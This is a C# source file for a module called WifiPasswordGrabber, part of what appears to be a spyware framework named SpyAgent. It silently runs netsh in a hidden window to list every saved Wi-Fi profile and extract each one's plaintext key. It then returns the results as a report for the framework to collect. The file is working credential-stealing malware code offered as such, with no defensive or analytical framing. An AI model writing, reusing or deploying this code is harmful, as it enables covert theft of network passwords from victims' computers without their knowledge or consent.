namespace SpyAgent.Modules;

using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;
using SpyAgent.Core;

internal sealed partial class WifiPasswordGrabber : ISpyModule
{
    public string ModuleName => "WifiPasswords";

    public Task<byte[]?> CollectAsync()
    {
        var profiles = GetWifiProfiles();
        if (profiles.Count == 0)
            return Task.FromResult<byte[]?>(null);

        var sb = new StringBuilder();
        sb.AppendLine("=== WiFi Passwords ===");
        sb.AppendLine($"Collected: {DateTime.UtcNow:u}");
        sb.AppendLine();

        foreach (var profile in profiles)
        {
            var password = GetProfilePassword(profile);
            sb.AppendLine($"SSID: {profile}");
            sb.AppendLine($"Password: {password ?? "(open/enterprise)"}");
            sb.AppendLine();
        }

        return Task.FromResult<byte[]?>(Encoding.UTF8.GetBytes(sb.ToString()));
    }

    private static List<string> GetWifiProfiles()
    {
        var output = RunNetsh("wlan show profiles");
        var matches = ProfileRegex().Matches(output);
        return matches.Select(m => m.Groups[1].Value.Trim()).ToList();
    }

    private static string? GetProfilePassword(string profileName)
    {
        var output = RunNetsh($"wlan show profile name=\"{profileName}\" key=clear");
        var match = PasswordRegex().Match(output);
        return match.Success ? match.Groups[1].Value.Trim() : null;
    }

    private static string RunNetsh(string arguments)
    {
        try
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "netsh",
                    Arguments = arguments,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            process.Start();
            var output = process.StandardOutput.ReadToEnd();
            process.WaitForExit(5000);
            return output;
        }
        catch
        {
            return "";
        }
    }

    [GeneratedRegex(@"All User Profile\s*:\s*(.+)", RegexOptions.Compiled)]
    private static partial Regex ProfileRegex();

    [GeneratedRegex(@"Key Content\s*:\s*(.+)", RegexOptions.Compiled)]
    private static partial Regex PasswordRegex();
}
